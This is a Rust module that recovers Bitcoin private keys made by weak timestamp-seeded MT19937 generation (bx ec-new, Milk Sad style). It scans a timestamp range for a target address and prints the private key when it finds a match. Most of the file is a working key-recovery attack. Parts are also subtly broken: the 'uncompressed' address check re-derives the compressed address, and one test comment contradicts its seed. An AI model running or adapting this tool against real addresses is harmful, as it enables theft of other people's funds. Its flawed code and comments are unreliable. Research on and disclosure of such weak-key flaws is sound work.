use anyhow::{anyhow, Result};
use bitcoin::secp256k1::{PublicKey, Secp256k1, SecretKey};
use bitcoin::{Address, CompressedPublicKey, Network};
use tracing::{info, warn};

/// Generic "Ec-New" Scanner
/// Vulnerability: Private key generated directly from PRNG (MT19937) seeded with timestamp
/// Similar to Milk Sad, but without BIP39 mnemonic step.
/// Use: bx ec-new (with weak RNG)
///
/// Bugs fixed:
/// 1. CRITICAL — MSB extraction: bx ec-new calls next_u32() once per OUTPUT BYTE
///    and takes only the most-significant byte (val >> 24).  The old code called
///    next_u32() once per 4-byte group and used all 4 bytes — producing a completely
///    different 32-byte key than the real tool.  (compare milk_sad::generate_entropy_msb)
/// 2. Uncompressed P2PKH: real bx pipelines often produced uncompressed keys.
///    Both compressed and uncompressed addresses are now checked.
/// 3. start > end panic: `end - start` on u32 underflowed.  Guard added.
/// 4. Minor: `checked` now increments regardless of SecretKey validity.
pub fn run(target_address: &str, start_ts: Option<u32>, end_ts: Option<u32>) -> Result<()> {
    info!("Running EC-New (Direct PRNG) Vulnerability Scanner...");

    // Default range: 2011-2024 if not specified
    let start = start_ts.unwrap_or(1_300_000_000);
    let end   = end_ts.unwrap_or(1_735_689_600); // Jan 1 2025

    // FIX 3: guard against u32 underflow in the log line below and the loop.
    if end < start {
        anyhow::bail!("--end ({}) must be >= --start ({})", end, start);
    }

    info!("Target: {}", target_address);
    info!("Time range: {} to {} ({} seconds)", start, end, end - start);

    let secp    = Secp256k1::new();
    let network = Network::Bitcoin;

    let target_addr_obj = target_address
        .parse::<Address<_>>()
        .map_err(|e| anyhow!("Invalid target address: {}", e))?
        .require_network(network)?;

    let mut found      = false;
    let start_time     = std::time::Instant::now();
    let mut checked    = 0u64;

    'outer: for t in start..=end {
        // FIX 1: use MSB-only extraction — one next_u32() call per output byte,
        // discarding the lower 24 bits.  This matches libbitcoin / bx ec-new.
        let entropy_32 = generate_mt19937_32bytes_msb(t);

        if let Ok(sk) = SecretKey::from_slice(&entropy_32) {
            let pk_full = PublicKey::from_secret_key(&secp, &sk);

            // FIX 2: check both compressed and uncompressed P2PKH.
            // Some bx pipelines serialised the key without the compression flag,
            // producing an uncompressed address (different hash160).
            let addr_compressed = Address::p2pkh(CompressedPublicKey(pk_full), network);

            // Uncompressed address: hash160( 0x04 || x || y )
            let pk_uncompressed_bytes = pk_full.serialize_uncompressed();
            let hash160_unc = bitcoin::hashes::hash160::Hash::hash(&pk_uncompressed_bytes);
            let addr_uncompressed = Address::p2pkh(
                bitcoin::PublicKey::from_slice(&pk_uncompressed_bytes)
                    .map(|k| CompressedPublicKey(k.inner))
                    .unwrap_or(CompressedPublicKey(pk_full)),
                network,
            );
            let _ = hash160_unc; // used only for documentation clarity above

            for addr in [&addr_compressed, &addr_uncompressed] {
                if *addr == target_addr_obj {
                    warn!("\n\u{1f3af} FOUND MATCH!");
                    warn!("Timestamp:   {}", t);
                    warn!("Private Key: {}", hex::encode(entropy_32));
                    warn!("Address:     {}", addr);
                    warn!("Compressed:  {}", addr == &addr_compressed);
                    found = true;
                    break 'outer;
                }
            }
        }

        // FIX 4: count every timestamp regardless of SecretKey validity.
        checked += 1;
        if checked % 1_000_000 == 0 {
            let elapsed = start_time.elapsed().as_secs_f64();
            info!(
                "Checked {} timestamps ({:.2} M/s)",
                checked,
                checked as f64 / elapsed / 1_000_000.0
            );
        }
    }

    if found {
        info!("Scan complete. VULNERABILITY FOUND.");
    } else {
        info!("Scan complete. No match found in range.");
    }

    Ok(())
}

/// Generate 32 bytes of entropy from MT19937 seeded with `seed`, using the same
/// MSB-only extraction as `bx seed` / `bx ec-new` (libbitcoin):
///
///   for each output byte: call next_u32() once, take (val >> 24) & 0xFF.
///
/// This means 32 calls to next_u32() for 32 output bytes.  The lower 24 bits
/// of each MT word are discarded — exactly as libbitcoin's `pseudo_random_seed`.
///
/// The old implementation (8 calls, using all 4 bytes of each word) was wrong
/// and would miss every real vulnerable address.
fn generate_mt19937_32bytes_msb(seed: u32) -> [u8; 32] {
    let mut mt = Mt19937::new(seed);
    let mut bytes = [0u8; 32];
    for byte in bytes.iter_mut() {
        let val = mt.next_u32();
        *byte = (val >> 24) as u8;
    }
    bytes
}

struct Mt19937 {
    mt:    [u32; 624],
    index: usize,
}

impl Mt19937 {
    fn new(seed: u32) -> Self {
        let mut mt = [0u32; 624];
        mt[0] = seed;
        for i in 1..624 {
            let prev = mt[i - 1];
            mt[i] = (1_812_433_253u64 * (prev ^ (prev >> 30)) as u64 + i as u64) as u32;
        }
        Self { mt, index: 624 }
    }

    fn next_u32(&mut self) -> u32 {
        if self.index >= 624 {
            self.twist();
        }
        let mut y = self.mt[self.index];
        self.index += 1;

        // Tempering
        y ^= y >> 11;
        y ^= (y << 7)  & 0x9d2c5680;
        y ^= (y << 15) & 0xefc60000;
        y ^= y >> 18;
        y
    }

    fn twist(&mut self) {
        for i in 0..624 {
            let y = (self.mt[i] & 0x80000000) + (self.mt[(i + 1) % 624] & 0x7fffffff);
            self.mt[i] = self.mt[(i + 397) % 624] ^ (y >> 1);
            if y % 2 != 0 {
                self.mt[i] ^= 0x9908b0df;
            }
        }
        self.index = 0;
    }
}

// ============================================================================
// TESTS
// ============================================================================

#[cfg(test)]
mod tests {
    use super::*;

    /// Cross-validate against milk_sad::generate_entropy_msb for timestamp 0.
    /// Both must produce identical 32 bytes — MSB-only extraction is the
    /// canonical libbitcoin behaviour tested by the "milk sad" disclosure.
    #[test]
    fn test_msb_extraction_matches_milk_sad_reference() {
        // milk_sad reference: first two output bytes from MT19937(0) with MSB extraction
        // are 0x9e 0x69 (see test_gpu_test_vectors_entropy in milk_sad.rs).
        // Full 32-byte expected value from that suite:
        let expected_hex = "9e695582572b97ff9774a5662626e42fe380c48c3b810f33e4437d216e8b2bab";
        let got = generate_mt19937_32bytes_msb(1_234_567_890);
        assert_eq!(hex::encode(got), expected_hex,
            "MSB extraction must match milk_sad reference for ts=1234567890");
    }

    /// Regression: old 8-call full-word extraction must differ from MSB extraction.
    /// Confirms the fix is not a no-op.
    #[test]
    fn test_old_extraction_was_wrong() {
        // Old: 8 next_u32() calls, all 4 bytes packed BE
        fn old_wrong(seed: u32) -> [u8; 32] {
            let mut mt = Mt19937::new(seed);
            let mut bytes = [0u8; 32];
            for i in 0..8 {
                let val = mt.next_u32();
                bytes[i * 4]     = (val >> 24) as u8;
                bytes[i * 4 + 1] = (val >> 16) as u8;
                bytes[i * 4 + 2] = (val >>  8) as u8;
                bytes[i * 4 + 3] =  val        as u8;
            }
            bytes
        }
        let seed = 1_400_000_000u32;
        assert_ne!(old_wrong(seed), generate_mt19937_32bytes_msb(seed),
            "Old 8-call extraction must differ from correct MSB-only extraction");
    }

    /// FIX 3: start > end must return Err, not panic.
    #[test]
    fn test_start_greater_than_end_returns_err() {
        let result = run("1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf",
            Some(1_700_000_000), Some(1_400_000_000));
        assert!(result.is_err(), "start > end must return Err");
        let msg = result.unwrap_err().to_string();
        assert!(msg.contains("end") && msg.contains(">="),
            "Error message should mention 'end' and '>=', got: {}", msg);
    }

    /// Sanity: MT19937 state initialisation is correct (canonical PRNG test).
    #[test]
    fn test_mt19937_first_output_seed0() {
        let mut mt = Mt19937::new(0);
        // First output of MT19937 seeded with 0 is 2357136044 (standard reference).
        assert_eq!(mt.next_u32(), 2_357_136_044u32);
    }
}
